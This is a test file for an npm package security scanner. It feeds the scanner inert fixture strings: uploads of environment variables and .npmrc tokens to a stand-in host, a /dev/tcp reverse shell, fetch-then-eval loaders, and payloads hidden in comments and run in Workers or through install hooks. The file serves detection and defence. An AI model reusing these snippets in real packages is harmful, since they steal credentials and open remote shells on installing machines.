// The independent review of apm-score-v10 (HOLD, safety 3/10): one describe block per finding, each with the review's
// own cases. Every package here is an inert string: the hosts are example.invalid, the tokens are fake, nothing runs.
import { describe, expect, test } from "bun:test";
import { analyze, CONFIRMED_FLOW_POINTS, finalize, SCORE_FLOOR, type Analysis, type TarEntry } from "../src/index.ts";
import { supersetGaps } from "./superset.ts";

const STATE = { publishedAt: 0, now: 1e13, deprecated: null, status: "active", statusReason: null } as const;

function entry(path: string, text: string): TarEntry {
  const data = new TextEncoder().encode(text);

  return { path, size: data.length, mode: 0o644, data };
}

function inputOf(files: Record<string, string>, scripts: Record<string, string> = {}) {
  const manifest = { name: "probe-pkg", version: "1.0.0", license: "MIT", main: "index.js", scripts };

  return { name: "probe-pkg", manifest, files: [entry("package.json", JSON.stringify(manifest)), ...Object.entries(files).map(([p, t]) => entry(p, t))], publisher: "a", previousPublishers: [] };
}

function scored(files: Record<string, string>, scripts?: Record<string, string>): Analysis {
  const input = inputOf(files, scripts);
  const a = analyze(input);

  // every case keeps every finding apm-score-v3 makes
  expect(supersetGaps(input, a)).toEqual([]);

  return a;
}

const scoreOf = (a: Analysis): number => finalize(a, STATE).score;
const risk = (a: Analysis, id: string) => a.signals.find((s) => s.id === id && s.points < 0);
const risks = (a: Analysis): string[] => a.signals.filter((s) => s.points < 0).map((s) => s.id);

const URL = "'https://example.invalid/c'";
const POSTINSTALL = { postinstall: "node index.js" };
const ENV_UPLOAD = `fetch(${URL},{method:'POST',body:JSON.stringify(process.env)});`;
const NPMRC_STEALER = `const t=require('fs').readFileSync(require('os').homedir()+'/.npmrc','utf8');fetch(${URL},{method:'POST',body:t});`;

/** The worker-floor-comment fixture's wrapper (sol-v8.json): a comment the code reads back with String(f) and runs in a Worker. */
const inCommentWorker = (payload: string): string => `function f(){/* ${payload} */}\nnew (require('worker_threads').Worker)(String(f).slice(15,-3),{eval:true});\n`;

describe("1: text a program recovers from its own comments and runs is read as code", () => {
  test("worker-floor-comment uploading the whole environment is refused (95 before)", () => {
    const a = scored({ "index.js": inCommentWorker(ENV_UPLOAD.replace("require", "process.getBuiltinModule")) });

    expect(risks(a)).toEqual(expect.arrayContaining(["exfiltration", "runs-decoded-code"]));
    expect(scoreOf(a)).toBeLessThan(SCORE_FLOOR);
  });

  test("an .npmrc stealer is refused alone, through the comment/Worker wrapper, and with postinstall (35, 97, 72 before)", () => {
    const direct = scored({ "index.js": NPMRC_STEALER });
    const wrapped = scored({ "index.js": inCommentWorker(NPMRC_STEALER) });
    const installed = scored({ "index.js": inCommentWorker(NPMRC_STEALER) }, POSTINSTALL);

    for (const a of [direct, wrapped, installed]) {
      expect(risks(a)).toEqual(expect.arrayContaining(["credential-read", "exfiltration"]));
      expect(scoreOf(a)).toBeLessThan(SCORE_FLOOR);
    }

    // what runs at install keeps its install context: the recovered code's request is install-time network
    expect(risk(installed, "install-eval")).toBeDefined();
    expect(scoreOf(installed)).toBeLessThanOrEqual(scoreOf(wrapped));
  });

  test("a regex body run through .source and a file reading its own source are recovered the same way", () => {
    const regex = scored({ "index.js": `const r=/${ENV_UPLOAD.replaceAll("/", "\\/")}/;\nnew (require('worker_threads').Worker)(r.source,{eval:true});\n` });
    const self = scored({ "index.js": `// ${ENV_UPLOAD}\nconst src=require('fs').readFileSync(__filename,'utf8');\nrequire('vm').runInThisContext(src.split('\\n')[0].slice(3));\n` });

    expect(scoreOf(regex)).toBeLessThan(SCORE_FLOOR);
    expect(scoreOf(self)).toBeLessThan(SCORE_FLOOR);
  });

  test("recovered text apm cannot read as code is at least code it decoded and runs", () => {
    // the comment is not a program once its delimiters go, but names a process call: running it is hiding code
    const a = scored({ "index.js": "function f(){/* require('child_process').exec( */}\nnew (require('worker_threads').Worker)(String(f).slice(15,-3),{eval:true});\n" });

    expect(risk(a, "runs-decoded-code")?.evidence.join(" ")).toContain("comment or a regex");
  });

  test("a function whose comments are prose, sent to a Worker as text, is not hidden code", () => {
    const a = scored({ "index.js": "function work(){\n  // add the two numbers the main thread sends\n  onmessage = (e) => postMessage(e.data[0] + e.data[1]);\n}\nmodule.exports = () => new Worker(URL.createObjectURL(new Blob([`(${work.toString()})()`])));\n" });

    expect(risks(a)).not.toContain("runs-decoded-code");
  });
});

describe("2: confirmed remote execution and confirmed secret transmission refuse on their own", () => {
  test("a literal reverse shell (50 before)", () => {
    const a = scored({ "index.js": "require('child_process').exec('bash -i >& /dev/tcp/10.0.0.1/4444 0>&1');" });

    expect(risk(a, "remote-shell")?.points).toBe(CONFIRMED_FLOW_POINTS);
    expect(scoreOf(a)).toBeLessThan(SCORE_FLOOR);
  });

  test("fetch then eval (50 before)", () => {
    const a = scored({ "index.js": `fetch(${URL}).then(r=>r.text()).then(c=>eval(c));` });

    expect(risk(a, "remote-shell")?.points).toBe(CONFIRMED_FLOW_POINTS);
    expect(scoreOf(a)).toBeLessThan(SCORE_FLOOR);
  });

  test("uploading the whole environment (62 before)", () => {
    const a = scored({ "index.js": ENV_UPLOAD });

    expect(risk(a, "exfiltration")?.points).toBe(CONFIRMED_FLOW_POINTS);
    expect(scoreOf(a)).toBeLessThan(SCORE_FLOOR);
  });

  test("an evaluator merely near a request keeps the lighter window weight", () => {
    const a = scored({ "index.js": "const v = fetch('https://example.invalid/version');\nmodule.exports = (expr) => eval(expr);\n" });

    expect(risk(a, "remote-shell")?.points ?? 0).toBeGreaterThan(CONFIRMED_FLOW_POINTS);
  });
});

describe("3: downloaded commands and evaluator aliases reach remote-shell", () => {
  test("a downloaded command passed to a destructured exec (100 before; 50 with postinstall)", () => {
    const src = `const { exec } = require("child_process"); fetch(${URL}).then(r => r.text()).then(cmd => exec(cmd));`;

    for (const a of [scored({ "index.js": src }), scored({ "index.js": src }, POSTINSTALL)]) {
      expect(risks(a)).toContain("remote-shell");
      expect(scoreOf(a)).toBeLessThan(SCORE_FLOOR);
    }
  });

  test("eval under another name, handed the response body (remote-shell lost before)", () => {
    const a = scored({ "index.js": `const run = eval; fetch(${URL}).then(r=>r.text()).then(body=>run(body));` });

    expect(risks(a)).toContain("remote-shell");
    expect(scoreOf(a)).toBeLessThan(SCORE_FLOOR);
  });

  test("a body gathered from https.get chunks and run with sh -c", () => {
    const a = scored({
      "index.js": `const https=require('https');const {spawn}=require('child_process');https.get(${URL},(res)=>{let body='';res.on('data',(d)=>{body+=d});res.on('end',()=>spawn('sh',['-c',body]))});`,
    });

    expect(risks(a)).toContain("remote-shell");
  });

  test("a downloaded version spliced into a fixed command is not running the download", () => {
    const a = scored({ "index.js": "const { execSync } = require('child_process');\nfetch('https://example.invalid/latest').then(r => r.json()).then(({ version }) => execSync(`npm view probe-pkg@${version} dist.tarball`));\n" });

    expect(risks(a)).not.toContain("remote-shell");
  });
});

describe("4: the environment object, however it is written", () => {
  const sends = (expr: string): Analysis => scored({ "index.js": `fetch(${URL},{method:'POST',body:JSON.stringify(${expr})});` });

  test("globalThis.process.env (97 before; 62 with postinstall)", () => {
    expect(scoreOf(sends("globalThis.process.env"))).toBeLessThan(SCORE_FLOOR);
    expect(scoreOf(scored({ "index.js": `fetch(${URL},{method:'POST',body:JSON.stringify(globalThis.process.env)});` }, POSTINSTALL))).toBeLessThan(SCORE_FLOOR);
  });

  test("a spread copy and Bun.env (100 before), with the env capability", () => {
    for (const a of [sends("{...process.env}"), sends("Bun.env")]) {
      expect(risks(a)).toContain("exfiltration");
      expect(a.capabilities.map((c) => c.id)).toContain("env");
      expect(scoreOf(a)).toBeLessThan(SCORE_FLOOR);
    }
  });

  test("Deno.env.toObject(), an alias, and Object.entries through a loop", () => {
    expect(scoreOf(sends("Deno.env.toObject()"))).toBeLessThan(SCORE_FLOOR);
    expect(scoreOf(scored({ "index.js": `const e = process.env; fetch(${URL},{method:'POST',body:JSON.stringify(e)});` }))).toBeLessThan(SCORE_FLOOR);
    expect(scoreOf(scored({ "index.js": `let out='';for (const k in process.env) out += k + '=' + process.env[k] + '\\n';fetch(${URL},{method:'POST',body:out});` }))).toBeLessThan(SCORE_FLOOR);
  });

  test("names read through an alias or globalThis are listed", () => {
    const a = scored({ "index.js": "const e = globalThis.process.env;\nmodule.exports = { region: e.APP_REGION, key: Bun.env.APP_KEY };\n" });

    expect(a.capabilities.find((c) => c.id === "env")?.names).toEqual(expect.arrayContaining(["APP_REGION", "APP_KEY"]));
  });
});

describe("5: credential paths followed into reads, and reads into requests, across files", () => {
  test("the read moved into an imported secrets.js (70 before)", () => {
    const a = scored({
      "index.js": `const t=require('./secrets.js');fetch(${URL},{method:'POST',body:t});`,
      "secrets.js": "module.exports=require('fs').readFileSync(require('os').homedir()+'/.npmrc','utf8');",
    });

    expect(risk(a, "exfiltration")?.points).toBe(CONFIRMED_FLOW_POINTS);
    expect(scoreOf(a)).toBeLessThan(SCORE_FLOOR);
  });

  test("the path exported by name from one file and read in another", () => {
    const a = scored({
      "index.js": `const { NPMRC } = require('./paths');const t=require('fs').readFileSync(NPMRC,'utf8');fetch(${URL},{method:'POST',body:t});`,
      "paths.js": "exports.NPMRC = require('path').join(require('os').homedir(), '.npmrc');",
    });

    expect(risks(a)).toContain("credential-read");
    expect(scoreOf(a)).toBeLessThan(SCORE_FLOOR);
  });

  test("a 350-character comment between the path and the read (97 before)", () => {
    const a = scored({ "index.js": `const p=require('os').homedir()+'/.npmrc';/*${"x".repeat(350)}*/const t=require('fs').readFileSync(p,'utf8');fetch(${URL},{method:'POST',body:t});` });

    expect(risks(a)).toEqual(expect.arrayContaining(["credential-read", "exfiltration"]));
    expect(scoreOf(a)).toBeLessThan(SCORE_FLOOR);
  });

  test("['.npm','rc'].join('') (70 before)", () => {
    const a = scored({ "index.js": `const t=require('fs').readFileSync(require('os').homedir()+'/'+['.npm','rc'].join(''),'utf8');fetch(${URL},{method:'POST',body:t});` });

    expect(scoreOf(a)).toBeLessThan(SCORE_FLOOR);
  });
});

describe("6: lifecycle scripts that run on the installing machine are install time", () => {
  const upload = { "index.js": "module.exports = 1;\n", "s.js": ENV_UPLOAD };

  test("prepare, prepack and postpack keep install context (62 before; postinstall 27)", () => {
    for (const hook of ["prepare", "prepack", "postpack"]) {
      const a = scored(upload, { [hook]: "node s.js" });

      expect(risk(a, "install-network"), hook).toBeDefined();
      expect(scoreOf(a), hook).toBeLessThan(SCORE_FLOOR);
    }
  });

  test("a build's operands are not what it runs: `rimraf ./dist && tsc` makes nothing in dist install time", () => {
    const a = scored({ "index.js": "module.exports = require('./dist');\n", "dist/index.js": "require('http').get('https://example.invalid');\n" }, { prepack: "rimraf ./dist && tsc" });

    expect(risks(a)).not.toContain("install-network");
  });
});

describe("7: no false labels", () => {
  test("sending one variable is not uploading the environment (30 before)", () => {
    const a = scored({ "index.js": `fetch(${URL},{method:'POST',body:JSON.stringify(process.env.EXAMPLE_API_KEY)});` }, POSTINSTALL);

    expect(risks(a)).not.toContain("exfiltration");
    expect(scoreOf(a)).toBeGreaterThanOrEqual(SCORE_FLOOR);
  });

  test("an .npmrc deny list beside a generic read is not a credential read (70 before)", () => {
    const a = scored({ "index.js": "const fs=require('fs');const DENY=['.npmrc','.ssh/'];module.exports=(p)=>DENY.some(d=>p.includes(d))?null:fs.readFileSync(p,'utf8');" });

    expect(risks(a)).not.toContain("credential-read");
    expect(scoreOf(a)).toBeGreaterThanOrEqual(90);
  });

  test("exporting ['.npm'+'rc'] names a credential file, reads nothing and hides no call (50 before)", () => {
    const a = scored({ "index.js": "module.exports=['.npm'+'rc'];" });

    expect(risks(a)).not.toContain("credential-read");
    expect(risks(a)).not.toContain("obfuscated");
    expect(scoreOf(a)).toBeGreaterThanOrEqual(90);
  });

  test("the same hidden name opened by a read is a read", () => {
    const a = scored({ "index.js": "const p = require('os').homedir() + '/' + '.npm' + 'rc';\nmodule.exports = require('fs').readFileSync(p, 'utf8');\n" });

    expect(risks(a)).toContain("credential-read");
  });
});
